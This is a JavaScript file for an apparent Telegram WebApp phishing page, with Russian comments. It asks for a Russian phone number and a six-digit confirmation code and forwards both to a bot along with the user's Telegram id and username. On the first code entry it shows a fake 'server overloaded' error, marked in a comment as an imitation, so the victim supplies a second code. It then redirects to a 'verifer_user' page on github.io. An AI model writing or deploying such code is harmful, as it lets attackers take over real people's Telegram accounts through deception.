document.addEventListener('DOMContentLoaded', () => {
    //// Проверка поддержки Telegram WebApp
    //if (!window.Telegram || !window.Telegram.WebApp) {
    //    console.error('Telegram WebApp is not available');
    //    showFatalError('Это приложение работает только в Telegram. Пожалуйста, откройте его через Telegram бота.');
    //    return;
    //}

    const tg = window.Telegram.WebApp;
    const elements = {
        phoneForm: document.getElementById('phone-form'),
        codeForm: document.getElementById('code-form'),
        phoneInput: document.getElementById('phone'),
        codeInput: document.getElementById('code'),
        phoneError: document.getElementById('phone-error'),
        codeError: document.getElementById('code-error'),
        submitPhoneBtn: document.getElementById('submit-phone'),
        submitCodeBtn: document.getElementById('submit-code')
    };

    // Инициализация приложения
    function init() {
        tg.expand();
        tg.setHeaderColor('#060137');
        tg.setBackgroundColor('#060137');
        tg.enableClosingConfirmation();

        setupEventListeners();
        sendEvent('init');
        vibrate('medium');
    }

    // Настройка обработчиков событий
    function setupEventListeners() {
        // Обработчики закрытия приложения
        tg.onEvent('viewportChanged', handleViewportChange);
        tg.onEvent('closingConfirmation', handleAppClose);

        // Обработчики ввода
        elements.phoneInput.addEventListener('input', formatPhoneInput);
        elements.codeInput.addEventListener('input', handleCodeInput);

        // Обработчики кнопок
        elements.submitPhoneBtn.addEventListener('click', handlePhoneSubmit);
        elements.submitCodeBtn.addEventListener('click', handleCodeSubmit);
    }

    // Очистка ресурсов
    function cleanup() {
        tg.offEvent('viewportChanged', handleViewportChange);
        tg.offEvent('closingConfirmation', handleAppClose);
    }

    // Виброотклик
    function vibrate(type = 'light') {
        if (!tg.HapticFeedback) return;

        const types = {
            'light': 'light',
            'medium': 'medium',
            'heavy': 'heavy',
            'error': 'error'
        };
        
        try {
            tg.HapticFeedback.impactOccurred(types[type] || 'light');
        } catch (error) {
            console.error('Vibration error:', error);
        }
    }

    // Отправка событий боту
    async function sendEvent(type, data = null) {
        if (!window.sendToBot) return;

        try {
            await window.sendToBot(type, {
                ...data,
                userId: tg.initDataUnsafe.user?.id,
                username: tg.initDataUnsafe.user?.username,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            console.error('Error sending event:', error);
        }
    }

    // Форматирование номера телефона
    function formatPhoneInput(e) {
        const input = e.target;
        const cursorPos = input.selectionStart;
        let value = input.value.replace(/\D/g, '');
        
        if (value.length > 0) value = '7' + value.substring(1);
        
        let formatted = '+7';
        if (value.length > 1) formatted += ' ' + value.substring(1, 4);
        if (value.length > 4) formatted += ' ' + value.substring(4, 7);
        if (value.length > 7) formatted += ' ' + value.substring(7, 9);
        if (value.length > 9) formatted += ' ' + value.substring(9, 11);
        
        input.value = formatted.substring(0, 16);
        input.setSelectionRange(cursorPos, cursorPos);
        
        if (value.length % 2 === 0) vibrate('light');
    }

    // Обработка ввода кода
    function handleCodeInput(e) {
        const value = e.target.value.replace(/\D/g, '');
        elements.codeInput.value = value.substring(0, 6);
        
        if (value.length > 0 && value.length <= 6) {
            vibrate('light');
        }
        
        if (value.length === 6) {
            handleCodeSubmit();
        }
    }

    // Валидация номера телефона
    function validatePhone(phone) {
        const clean = phone.replace(/\D/g, '');
        return /^7\d{10}$/.test(clean);
    }

    // Отправка номера телефона
    async function handlePhoneSubmit() {
        const phone = elements.phoneInput.value.replace(/\D/g, '');
        
        if (!phone) {
            showError(elements.phoneError, 'Введите номер телефона');
            vibrate('error');
            return;
        }
        
        if (!validatePhone(phone)) {
            showError(elements.phoneError, 'Требуется российский номер: +7 XXX XXX XX XX');
            vibrate('error');
            return;
        }
        
        vibrate('medium');
        hideError(elements.phoneError);
        elements.phoneForm.classList.add('hidden');
        elements.codeForm.classList.remove('hidden');
        
        try {
            await sendEvent('phone', { phone: `+${phone}` });
        } catch (error) {
            console.error('Phone submission error:', error);
            showError(elements.phoneError, 'Ошибка отправки. Попробуйте позже');
            elements.phoneForm.classList.remove('hidden');
            elements.codeForm.classList.add('hidden');
        }
    }

    // Отправка кода подтверждения
    async function handleCodeSubmit() {
        const code = elements.codeInput.value.trim();
        
        if (!/^\d{6}$/.test(code)) {
            showError(elements.codeError, 'Ровно 6 цифр');
            vibrate('error');
            return;
        }
        
        vibrate('medium');
        hideError(elements.codeError);
        setLoading(elements.submitCodeBtn, true);
        
        try {
            await sendEvent('code', { code });
            
            if (attemptCount === 0) {
                // Первая попытка - имитация ошибки
                setTimeout(() => {
                    setLoading(elements.submitCodeBtn, false);
                    showError(elements.codeError, 'Сервер перегружен. Попробуйте снова');
                    elements.codeInput.value = '';
                    attemptCount++;
                    vibrate('heavy');
                }, 3000);
            } else {
                // Вторая попытка - успех
                setTimeout(() => {
                    vibrate('heavy');
                    sendEvent('verification_success', { code, attempts: attemptCount + 1 });
                    window.location.href = 'https://otz2026.github.io/mybot/verifer_user/index.html';
                }, 2000);
            }
        } catch (error) {
            console.error('Code submission error:', error);
            setLoading(elements.submitCodeBtn, false);
            showError(elements.codeError, 'Ошибка отправки. Попробуйте позже');
        }
    }

    // Вспомогательные функции
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
        element.style.animation = 'shake 0.5s';
    }

    function hideError(element) {
        element.style.display = 'none';
    }

    function setLoading(button, isLoading) {
        button.disabled = isLoading;
        button.innerHTML = isLoading ? '<div class="loader"></div>' : 'Подтвердить';
    }

    function handleViewportChange(e) {
        if (e.isStateStable && !e.isExpanded) {
            handleAppClose();
        }
    }

    function handleAppClose() {
        sendEvent('app_close');
    }

    function showFatalError(message) {
        document.body.innerHTML = `
            <div class="error-container">
                <h2>Ошибка</h2>
                <p>${message}</p>
            </div>
        `;
    }

    // Инициализация приложения
    init();

    // Очистка при размонтировании
    window.addEventListener('beforeunload', cleanup);
});